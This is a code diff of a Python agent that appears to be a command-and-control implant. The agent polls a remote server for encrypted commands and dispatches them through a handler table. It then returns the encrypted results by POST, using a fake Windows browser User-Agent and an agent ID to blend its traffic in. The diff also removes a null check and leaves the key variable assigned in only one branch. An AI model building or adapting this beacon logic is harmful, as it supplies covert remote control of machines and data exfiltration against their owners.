@@ -138,27 +138,24 @@ def command_handler():
             decrypted_server_response = decrypt_data_by_server(msg,iv,int(agent_data['aes_key']))
             #--------------------------------------
             logger.info(decrypted_server_response)
-            if decrypted_server_response:
-                #here i have to decrypt p
-                if decrypted_server_response == "nothing":
-                    logger.info("no command by server")
-                else:
-                    aes_key = int(agent_data['aes_key'])
-                command, *args = decrypted_server_response.split()
-                handler = COMMAND_HANDLERS.get(command)
-                if handler:
-                    try:
-                        encrypted_content, iv = handler(aes_key,args)
-                        response = send_data_to_server(encrypted_content, iv)
-                        logger.info(response)
-                    except Exception as e:
-                        logger.error(f"handler for '{command}' failed: {e}")
-                        encrypted_content, iv = encrypt_data_by_server("Alert: command failed", aes_key)
-                        response = send_data_to_server(encrypted_content, iv)
-                        logger.info(response)
+
+            if decrypted_server_response == "nothing":
+                logger.info("no command by server")
             else:
-                #might be not useful - to delete!
-                logger.info("no avilable command")
+                aes_key = int(agent_data['aes_key'])
+            command, *args = decrypted_server_response.split()
+            handler = COMMAND_HANDLERS.get(command)
+            if handler:
+                try:
+                    encrypted_content, iv = handler(aes_key,args)
+                    response = send_data_to_server(encrypted_content, iv)
+                    logger.info(response)
+                except Exception as e:
+                    logger.error(f"handler for '{command}' failed: {e}")
+                    encrypted_content, iv = encrypt_data_by_server("Alert: command failed", aes_key)
+                    response = send_data_to_server(encrypted_content, iv)
+                    logger.info(response)
+
 
 
 #the target of the function is to send a GET commands to the server
@@ -170,6 +167,7 @@ def ask_for_keys():
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         }
         response = requests.get(f'{BASE_URL}getkeys',headers=custom_headers)
+        logger.info(response.text)
     except requests.exceptions.ConnectionError:
         logger.info("Connection Error")
         return "Connection Error"
@@ -202,9 +200,9 @@ def send_data_to_server(data_to_send,iv):
             "Agent-ID": f"{generate_agent_id()}",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         }
-        int_iv = int.from_bytes(iv,byteorder='little')
+        base64_iv = base64.b64encode(iv).decode('utf-8')
         base64_content = base64.b64encode(data_to_send).decode('utf-8')
-        data =({"content": base64_content,"iv": str(int_iv)})
+        data =({"content": base64_content,"iv": base64_iv})
         response = requests.post(f'{BASE_URL}getcommands',json=data,headers=custom_headers)
 
     except requests.exceptions.ConnectionError:
@@ -219,7 +217,7 @@ def send_data_to_server(data_to_send,iv):
 def get_encryption_data():
     while agent_data['is_encrypted'] == 'False':
         logger.info(f"encryption status is : {agent_data['is_encrypted']}")
-        logger.info("ask for data")
+        logger.info("ask for keys")
         data = ask_for_keys()
         logger.info(f"the json response is {data}")
         time.sleep(1)
